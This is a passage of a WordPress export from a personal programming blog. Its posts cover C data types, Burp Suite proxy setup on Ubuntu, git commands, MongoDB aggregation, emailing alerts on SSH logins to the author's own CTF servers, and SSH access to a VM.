		<wp:post_date_gmt>2016-03-16 22:08:11</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>compile-and-run-a-c-program</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="c"><![CDATA[c]]></category>
		<category domain="post_tag" nicename="programming"><![CDATA[programming]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[20827819802]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>C - variables, data-types and format-characters</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/03/17/c-variables-data-types-and-format-characters/</link>
		<pubDate>Thu, 17 Mar 2016 02:42:03 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=109</guid>
		<description></description>
		<content:encoded><![CDATA[Okay, so let's talk a bit about data-types in C. Coming from JavaScript this might be a bit confusing. In JavaScript you have few data-types (in comparison with C), six primitiv data-types: Null, Undefined, String, Number, Booleon, Symbol, and the data-type Object. JavaScript is a loosely-typed or dynamic language. This means that you don't have to define what type of data a variable will be. 

For example, all of these data-types are different, but we just define them as variables, without specifying which types.
[code lang="js"]
var text = &quot;I am a string&quot;;
var digit = 42;
var float = 4.2;
[/code]

But in C that does not work.

So why do we need to define what type of variable/data-type we are going to use? Because that specifies the amount of space used in the storage, and how the bit-pattern is interpreted. So different data-types occupy different amount of storage. The minimum amount of memory we can manage in C is 1 byte.

Here are the different fundamental data-types and the space they take up (taken from <a href="http://www.tutorialspoint.com/cprogramming/c_data_types.htm">here</a>):

<strong>Character types</strong>
char - 1 byte - -128 to 127 or 0 to 255
unsigned char - 1 byte - 0 to 255
signed char - 1 byte - -128 to 127

<strong>Integer types</strong>
int - 2 or 4 bytes - -32,768 to 32,767 or -2,147,483,648 to 2,147,483,647
unsigned int - 2 or 4 bytes - 0 to 65,535 or 0 to 4,294,967,295
short - 2 bytes - -32,768 to 32,767
unsigned short - 2 bytes - 0 to 65,535
long - 4 bytes - -2,147,483,648 to 2,147,483,647
unsigned long - 4 bytes - 0 to 4,294,967,295

<strong>Float types</strong>
float - 4 byte - 1.2E-38 to 3.4E+38 - 6 decimal places
double - 8 byte - 2.3E-308 to 1.7E+308 - 15 decimal places
Because doubles take up double the space, 8 byte we can fit in more decimals in it.
long double - 10 byte - 3.4E-4932 to 1.1E+4932 - 19 decimal places

Well, that is a bit complicated. A better way to understand it to understand the following as basic variables:
int - integer.
float - decimal number.
double - more precise decimal number.
char - a single character.
void - valueless special purpose type.

These basic variables can be defined more precisely using <strong>size qualifiers</strong>, <strong>sign qualifiers</strong> or <strong>const qualifier</strong>. 

The <strong>size qualifier</strong> alters the size of the variable by using the keywords <strong>long</strong> and <strong>short</strong>. The int variable is 2-4 bytes, but if long is used with it the size becomes 4-8 bytes.
int == 2-4 bytes
short int == 2 bytes
long int == 4-8 bytes

<strong>Sign qualifiers</strong> define if a variable can hold positive or negative values.
unsigned int;
Can only hold 0 or positive values.
A variable is by default signed. So that is not needed to add.

<strong>Const qualifier</strong>
A const keywords makes a variable constant, so that it can not be changed.


It's interesting to note here that C does not have the concept of strings. Just characters. A string in C is just an array of characters.
But in order to find out the size of a data-type or a variable you can use the built-in sizeof-function. Here is an example:

[code lang="c"]
#include &lt;stdio.h&gt;
#include &lt;limits.h&gt;

int main(){
  int test = 8;
  printf(&quot;Storage-size of a an int: %zu \n&quot;, sizeof(test));
  return 0;
}

[/code]

So, the format to create variables in C is the following:
type name = value;

[code lang="c"]
#include &lt;stdio.h&gt;

int main(){
  // This is an integer
  // Format character: %d as in digit
  int age = 10;
  printf(&quot;This is the integer: %d\n&quot;, age);

  // This is a floating point
  // Format character: %f as in float
  float floating_point = 10.33;
  printf(&quot;This is the decimal_number %f\n&quot;, floating_point);

  // This is also a floating point, but much bigger.
  // Format character: also %f as in float
  double kinda_big_number = 44444.333233;
  printf(&quot;This is a big floating point: %f\n&quot;, kinda_big_number);

  // This is a character
  // Format character: %c as in character
  // Notice that a single character is written with only single-quotation-marks
  char one_character = 'H';
  printf(&quot;This is one character: %c\n&quot;, one_character);

  // This is a string
  // Format character: %s as in string
  char several_characters[] = &quot;hello world&quot;;
  printf(&quot;This is a string: %s\n&quot;, several_characters);
  return 0;
}

[/code]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>109</wp:post_id>
		<wp:post_date>2016-03-17 02:42:03</wp:post_date>
		<wp:post_date_gmt>2016-03-17 02:42:03</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>c-variables-data-types-and-format-characters</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="c"><![CDATA[c]]></category>
		<category domain="post_tag" nicename="programming"><![CDATA[programming]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[20833599580]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Install Burp Suite on Ubuntu 14.04</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/03/17/install-burp-suite-on-ubuntu-14-04/</link>
		<pubDate>Thu, 17 Mar 2016 19:19:21 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=223</guid>
		<description></description>
		<content:encoded><![CDATA[Burp Suite is a program that contains many features related to web security. It contains a proxy server that let's the user intercept and manipulate communication between the client/browser and the server. It lets the user manipulate data before it is sent to the server. It also contains a lot of other features.

In order to get Burp Suite up and running on Ubuntu 14.04 (and probably other Ubuntu-versions as well) we first need to make sure we have Java-installed. You can check that by running the following command in the terminal:
[code]java -version[/code]
Your terminal should respond with the version, for example:
java version "1.7.0_95"
If you don't have java installed make sure to install it. <a href="https://www.digitalocean.com/community/tutorials/how-to-install-java-on-ubuntu-with-apt-get">Here is a guide</a>.
Okay, now go ahead and download Burp SUite from the <a href="https://portswigger.net/burp/download.html">Portswiggers website</a>.
Once it is downloaded you just move it to wherever you want to have it.
I had to change the file permission in order to execute it as a normal user.
[code]
chmod +x burpsuite_free_v1.6.32.jar
./burpsuite_free_v1.6.32.jar
[/code]

<h2>Configure with Chrome</h2>
In order to get burp suite to act as a proxy you need to configure your web browser, to pass all traffic through burp. In Firefox I think this is done through some settings in the browser, but Chrome picks up the settings from the computer itself. If you, in Chrome, go to Preferences/Advanced Settings/Network/Change Proxy Settings you will receive this note:

"When running Google Chrome under a supported desktop environment, the system proxy settings will be used. However, either your system is not supported or there was a problem launching your system configuration.

But you can still configure via the command line. Please see man google-chrome-stable for more information on flags and environment variables."

So, in order to get the proxy set up correctly we have to open up System Settings, it can be done through the Unity Dash or with the command:
[code]unity-control-center[/code]
In System Settings we open up Network, then we choose manual and add for HTTP Proxy 127.0.0.1, with port 8080.

Now you can go ahead and launch Burp Suite. Then click on Proxy and make sure that Intercept is on. Now you can visit any http-website. You will notice that the page will not load. That means that burp suite is working as it should, and that it has intercepted the http-request. Now we can change whatever parameters in the http-header that we want to change. And when you are done you just click Forward. If you don't want to intercept the traffic any more you just turn intercept off.

This is far from a perfect solution, but it works. But in order to use your browser without Burp Suite you have to turn off the Proxy in the System Settings/network. 

<h2>Configure with HTTPS</h2>
At the moment you are only able to intercept http-traffic. But these days less and less websites run without ssl. So let's configure Burp Suite to be able to intercept https traffic.
First go to System Settings/Network/Network Proxy/Manual there you add: 127.0.0.1 with port 8080 at the HTTPS-Proxy field.
Now open Burp Suite and go to Proxy and turn intercept on. Now go visit https://portswigger.net. You will now get an error message saying that the traffic is not secure. That is because Chrome knows that Burp is intercepting the traffic and it gives you a warning. For us it is no big deal because we know what is provoking it, but if you get that while you are surfing at a café or on some other open network you should assume that someone is monitoring your traffic.
Anyways, click on the little lock next to the cross-over HTTPS. Click on Certificate information, and then export the certificate so some place on your computer.
Now open up Preferences in Chrome and then scroll down to advanced settings, there you will find HTTPS/SSL Manage Exceptions. Click on it and the click on Authorities, then import. Then you just import the certificate and you are done.
Now Burp Suite should work on HTTPS-web pages.

<h2>Running it on localhost</h2>
So, you want to try out Burp on a project that you are working on on your local computer. Burp does not initially work on localhost (your Internal IP-address). But that is easy to fix.
You just have to add it to your hosts file.
On ubuntu that means you have to do the following:

[code lang="bash"]
#Get your internal ip-address:
ifconfig
#Edit your hosts-file
sudo vim /etc/hosts
#Now you add your internal ip and give it a name.
192.168.1.123    myprojekt.dev
[/code]
You can name it whatever you like. Remember that you have to have a tab between the ip and name. It cannot be spaces. 
Now you just go to myprojekt.dev in your browser. If you are running it on a specific port just add the port in the browser, not in the hosts-file (because that won't work). So just go to: myprojekt.dev:8080 (or whatever port you use).]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>223</wp:post_id>
		<wp:post_date>2016-03-17 19:19:21</wp:post_date>
		<wp:post_date_gmt>2016-03-17 19:19:21</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>install-burp-suite-on-ubuntu-14-04</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="burp-suite"><![CDATA[burp suite]]></category>
		<category domain="post_tag" nicename="how-to"><![CDATA[how-to]]></category>
		<category domain="post_tag" nicename="security"><![CDATA[security]]></category>
		<category domain="post_tag" nicename="tools"><![CDATA[tools]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[20857171450]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>JavaScript Compilers, Engines, Interpreters and Virtual Machines - What&#039;s the difference?</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/?p=271</link>
		<pubDate>Mon, 30 Nov -0001 00:00:00 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=271</guid>
		<description></description>
		<content:encoded><![CDATA[Virtual Machine == Compiler?
A Compiler do the following:
Syntax parsing
Creates Syntax tree
Translates it to bytecode
Then, sometimes to Machine Code

Lexical Environment

Execution Context
As I understand it the Execution Context in like the scope where a code is positioned, that means not inside a function. If you run an empty javascript file in your browser the Engine (V8 in Chrome) automatically creates the Global Object. The global object can be reached with the keyword "this". In a browser the Global Object is the same as the Window Object. In NodeJS you don't have a Window Object, but instead you have another object that is filled with stuff.

So when the Engine executes your code it does so in two phases. In the first face it goes through all your code and takes note of all variables and functions and creates space for it in the memory. But in the memory all variables are set to undefined.
In the second phase of the execution your code is executed. And it is in this phase that the value is correctly assigned to the variables and in the memory. This explains the hoisting phenomenon.

One example of the many things that engines do is coercion. So, as you probably know JavaScript is dynamically typed. That means that we don't have to define what data-type a variable is. We just call "var" and we are done. This is pretty good, because it allows us to easily change between data-types. For string to number without much problem.

Frågor:
Hur mycket minne upptar en variable som är undefined? hur stor är ett objekt?]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>271</wp:post_id>
		<wp:post_date>2016-03-22 23:34:38</wp:post_date>
		<wp:post_date_gmt>0000-00-00 00:00:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name></wp:post_name>
		<wp:status>draft</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1959580]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Agile and Scrum - What is it?</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/?p=303</link>
		<pubDate>Mon, 30 Nov -0001 00:00:00 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=303</guid>
		<description></description>
		<content:encoded><![CDATA[
This video describes it pretty well
https://www.youtube.com/watch?v=jNhRX-RBs_4]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>303</wp:post_id>
		<wp:post_date>2016-03-21 12:08:02</wp:post_date>
		<wp:post_date_gmt>0000-00-00 00:00:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name></wp:post_name>
		<wp:status>draft</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
	</item>
	<item>
		<title>Fundamental git commands</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/03/21/fundamental-git-commands/</link>
		<pubDate>Mon, 21 Mar 2016 12:31:22 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=305</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>View changes in a file</h2>
To view changes in a file in git you just use the command:
[code]git diff path/to/file.js[/code]

It happens that whitespace is showed. Which shows almost everything as changed. To solve this, add the -b flag.
[code]
git diff -b path/to/file
[/code]

<h2>Discard changes in an unstaged file</h2>
Every now and then Git shows that I have edited a file, but when I run git diff I can see that I have added and removed the same line. I think this happens if I add a line and then remove it. So basically nothing has changed (and I haven't actually edited the file, just opened it). I think it is better to discard the h2&gt;changes to that the commit does not get cluttered with files that we actually haven't modified. So in order to discard the changes from git I use the following command:
[code]
git checkout -- app/config/rest.js
[/code]
This is the recommended command from git, and it shows when we run git status.

<h2>Create new branch</h2>
There are two ways.
[code lang="bash"]
#Create a branch
git branch nameOfBranch
#Create a branch and switch to it
git checkout -b nameOfBranch
[/code]

<h2>Remove branch</h2>
If the branch is merged you can use the command:
[code lang="bash"]
git branch -d myBranch
[/code]

If it is not merged you have to use:
[code lang="bash"]
git branch -D myBranch
[/code]

<h2>Remove remote branch</h2>
[code]
git push origin --delete the_remote_branch
[/code]


<h2>Switch branch without committing</h2>
So if you have made some changes in a branch and then switch branch without committing the changes git will automatically merge those branches. Which might not be what you want. But you might not feel ready to commit the changes. 
<strong>So how do you switch branch without having to merge the branches and without having to commit the changes?</strong>
The answer is: stash.
So, let's say you have made changes that you haven't committed or added but want to switch branch. You just use the following command:
[code]
//Branch: testBranch
git stash
git checkout master
//Make some changes or whatever you wanted to do
git checkout testBranch
git stash pop
[/code]
And now you are back and can keep working on your branch. 

Check out this for a better understanding of how to use git stash: 
https://git-scm.com/book/en/v2/Git-Tools-Stashing-and-Cleaning

<h2>Create a new remote branch</h2>
So let's say that you have a master-branch and you want to create a development-branch.

First you create your branch locally
[code lang="bash"]
git checkout -b development
[/code]
Then you push it to your remote repo
[code lang="bash"]
git push -u origin development
[/code]

<h2>View commit log</h2>
So let's say you have made some commits. And then you want to see what those commits were. You can't run [code]git diff[/code]. So instead you can run [code]git log -p[/code]
This will show you the difference in each commit.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>305</wp:post_id>
		<wp:post_date>2016-03-21 12:31:22</wp:post_date>
		<wp:post_date_gmt>2016-03-21 12:31:22</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>fundamental-git-commands</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="git"><![CDATA[git]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<category domain="post_tag" nicename="work-flow"><![CDATA[work-flow]]></category>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[20975045635]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_68e26aa40d232ad23d2f390f94406507</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_cc9294a121209c077ec1bd8e46c7b646</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Aggregation pipeline in MongoDB</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/04/01/aggregation-pipeline-in-mongodb/</link>
		<pubDate>Fri, 01 Apr 2016 13:04:39 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=326</guid>
		<description></description>
		<content:encoded><![CDATA[Aggregate is a way to find and filter data in MongoDB.
It uses a pipeline structure, so the data is requested and then pass through a number of different filters. Is is similar to piping as we do it in unix.

The one I have been using is $match and $group

<h2>$group</h2>
Group is one of the most common methods in aggregate. It takes the input data and divides it up in different buckets/sections (or whatever you like to call it). 
Let's say our database looks something like this:
[code lang="js"]
//collection-name: names
{
nombre: &quot;Philip&quot;
},
{
nombre: &quot;Pelle&quot;
},
{
nombre: &quot;Philip&quot;
}
[/code]
It is just three documents with one value, nombre. So lets group these values together.

[code lang="js"]
    names.aggregate({
      $group: {
        _id: {
          name: &quot;$nombre&quot;
        }
      }
    }, function(err, result){
      console.log(result)
    });
[/code]

This pipes the whole collection through our aggregate method. The method then groups the different $nombre-fields into different buckets. All the fields with "Philip" is grouped together in one bucket. And "Pelle" is put into it's own bucket.

This is not so useful though. So let's count to see how many Philip's there are, and how many Pelle. This introduces at least a little bit of functionality.

[code language="js"]
      $group: {
        _id: {
          name: &quot;$nombre&quot;
        },
        count: {
          $sum: 1
        }
      }
[/code]

So now we have created a bucket for each nombre-field in the documents. Now we want to count how many they are. So in the group object we create a count-key and as a value we add another object that sums it all up, adding 1 for each document. If we but 2 it is going to add two for each document. Pretty simple.
So now, we are gonna get the data without any order. So let's sort it in ascending order.

[code lang="js"]

    name.aggregate({
      $group: {
        _id: {
          name: &quot;$nombre&quot;
        },
        count: {
          $sum: 1
        }
      }
    },
    {
      $sort: {
        count: -1
      }
    }, function(err, result){
      console.log(result)
    });
[/code]

Okay, so here we are saying that we want to sort the count-variable and then sort it in ascending order.

That's it for now.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>326</wp:post_id>
		<wp:post_date>2016-04-01 13:04:39</wp:post_date>
		<wp:post_date_gmt>2016-04-01 13:04:39</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>aggregation-pipeline-in-mongodb</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[21346315206]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>How to automatically send a notification through email when someone logs in through SSH to server</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/03/31/how-to-send-a-simple-email-from-a-server/</link>
		<pubDate>Thu, 31 Mar 2016 21:40:55 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=368</guid>
		<description></description>
		<content:encoded><![CDATA[Wow, that was a pretty log title.
I have been working a bit on setting upp vulnerable servers to play CTF with some friends. So I wanted to have a system where the server emails me every time someone successfully logs in to the server.

It requires two steps. 
1. Setting up email on the server
2. Writing script that sends email upon SSH-login


<h2>Setting up email on the server</h2>
Email is sent through the <a href="https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol">Simple Mail Transfer Protocol</a>. To make use of this protocal we need the program Simple SMTP(sSMTP).
In order to send an email directly from the server you need a domain-name. But I don't have time for that, so instead I am going to relay the email through an account at gmail.com. From what I have seen online, this seems to be the most common solution for small projects like this.

So let's download and install ssmtp.
[code lang="bash"]
sudo apt-get update
sudo apt-get install ssmtp
[/code]
After we have installed ssmtp we need to do a bit of configuration. 
[code lang="bash"]
sudo vim /etc/ssmtp/ssmtp.conf
[/code]
[code lang="bash"]
# Config file for sSMTP sendmail
#
# The person who gets all mail for userids &amp;lt; 1000
# Make this empty to disable rewriting.
#root=postmaster
root=myEmailAddress@gmail.com

# The place where the mail goes. The actual machine name is required no
# MX records are consulted. Commonly mailhosts are named mail.domain.com
#mailhub=mail
mailhub=smtp.gmail.com:587

AuthUser=myEmailAddress@gmail.com
AuthPass=MyGmailPassword
UseTLS=YES
UseSTARTTLS=YES

# Where will the mail seem to come from?
#rewriteDomain=
rewriteDomain=gmail.com

# The full hostname
#hostname=MyMediaServer.home
hostname=localhost

# Are users allowed to set their own From: address?
# YES - Allow the user to specify their own From: address
# NO - Use the system generated From: address
FromLineOverride=YES
[/code]

Wow easy-peasy, now let's send an email.

[code lang="bash"]
ssmtp myEmailAddress@gmail.com
To: blabla@gmail.com
From: myEmailAddress@gmail.com
Subject: Test
#ctr-d to send
[/code]

Of course, that didn't work. 
So i checked the log-file: cat /var/log/mail.log
Where I found this error:
Mar 31 17:13:25 ctf sSMTP[19275]: Authorization failed (534 5.7.14  https://support.google.com/mail/answer/78754 j8sm4704154qhj.19 - gsmtp)

So I started googeling it, and <a href="http://serverfault.com/questions/635139/how-to-fix-send-mail-authorization-failed-534-5-7-14">this</a> answer lead me to this <a href="https://support.google.com/accounts/answer/6009563">answer</a> from google. That answer led me to this page: <a href="https://g.co/allowaccess">https://g.co/allowaccess</a>, which lets you allow access from other apps.

And now it is working.

Okay. So now any user on the server can read the config file (/etc/ssmtp/ssmtp.conf). Which includes out password, so that it not optimal. So let's set the file permission so that only root can read the file.
[code lang="bash"]
chmod 700 /etc/ssmtp/ssmtp.conf
[/code]
Now you can check to see if other users can read the file or not.
[code lang="bash"]
#Granted that you are root
su userName
cat /etc/ssmtp/ssmtp.conf
#should output: cat: /etc/ssmtp/ssmtp.conf: Permission denied
[/code]


There are many other email clients  out there. Mailx, mutt and sendmail are some.

<h2>Check hos is loggin in</h2>
So how do we know if someone has logged in through ssh to out server?

My initial though was to parse the ssh-logfile and then run a cron-job that would check it every 10 minutes or so. But after some googleing I soon discovered that there is a much better way to solve the problem. <a href="http://askubuntu.com/questions/179889/how-do-i-set-up-an-email-alert-when-a-ssh-login-is-successful">This</a> SO-answer provided a great solution. 

First we create the bash-script and put it in /etc/ssh/login-notify.sh. This script is pretty straight-forward. We set the sender and recipient in each variable. And then we have an if-statement that returns true if anything except close_session happens. And then we use mailx to send the email.

[code lang="bash"]
#!/bin/sh

# Change these two lines:
sender=&quot;sender-address@example.com&quot;
recipient=&quot;notify-address@example.org&quot;

if [ &quot;$PAM_TYPE&quot; != &quot;close_session&quot; ]; then
    host=&quot;`hostname`&quot;
    subject=&quot;SSH Login: $PAM_USER from $PAM_RHOST on $host&quot;
    # Message to send, e.g. the current environment variables.
    message=&quot;`env`&quot;
    echo &quot;$message&quot; | mailx -r &quot;$sender&quot; -s &quot;$subject&quot; &quot;$recipient&quot;
fi
[/code]

Then we need to make it executable:
[code lang="bash"]
chmod +x /etc/ssh/login-notify.sh
[/code]

You then add the following line the file: /etc/pam.d/sshd
[code lang="bash"]
#/etc/pam.d/sshd
session optional pam_exec.so seteuid /etc/ssh/login-notify.sh
[/code]

Notice that is says:
[code lang="bash"]
# SELinux needs to be the first session rule.  This ensures that any
# lingering context has been cleared.  Without this it is possible that a
# module could execute code in the wrong domain.
[/code]

So it is probably a good idead to add the above code after this paragraph.

So, who the hell is PAM? Well, PAM stands for Pluggable Authentifacion Modules, and is basically the program in charge of stuff that regards authentication. If we check:
[code lang="bash"]
ls /etc/pam.d
[/code]
These are the config-files for the programs that uses pam. chsh, cron, newuser, passwd, login, sshd, and some others. Here you can really configure these programs down to details. For more about PAM check out <a href="http://www.tuxradar.com/content/how-pam-works">this excellent resource</a>.
 ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>368</wp:post_id>
		<wp:post_date>2016-03-31 21:40:55</wp:post_date>
		<wp:post_date_gmt>2016-03-31 21:40:55</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>how-to-send-a-simple-email-from-a-server</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[21325750095]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Setting up SSH to Ubuntu-server</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/04/01/setting-up-ssh-to-ubuntu-server/</link>
		<pubDate>Fri, 01 Apr 2016 20:51:11 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=413</guid>
		<description></description>
		<content:encoded><![CDATA[I am running Ubuntu Server on a VM, but you can't copypasta commands and stuff to it (I have set the bidirectional settings in Virtual Box - but it only works in gui-ubuntu I think). So the next best thing is just to SSH into the VM. It's pretty much the same thing but I get to use the Terminal instead of the crappy terminal that is on the server.

But I always forget the process of setting up SSH. So here it is.

On the VM we first need to go into the settings in VirtualBox. To network and then set Bridged Adapter. This allows the VM to obtain an internal IP and connect it to the rest of the network. 

[code lang="bash"]
sudo apt-get update
sudo apt-get install openssh-server
sudo ufw allow 22
[/code]
Updating, downloading and installing openssh-server. And then we open ssh port 22 on the firewall.

Now we need to know out servers internal IP so that we can connect to it. There are a few ways to find it.
[code lang="bash"]
ifconfig
ip addr show
#or
ip route get 8.8.8.8 | awk '{print $NF; exit}'
[/code]
Either way the address should look something like this: 192.168.1.101

Now let's log in:
[code lang="bash"]
ssh username@192.168.1.101
[/code]
Now we get this:
[code lang="bash"]
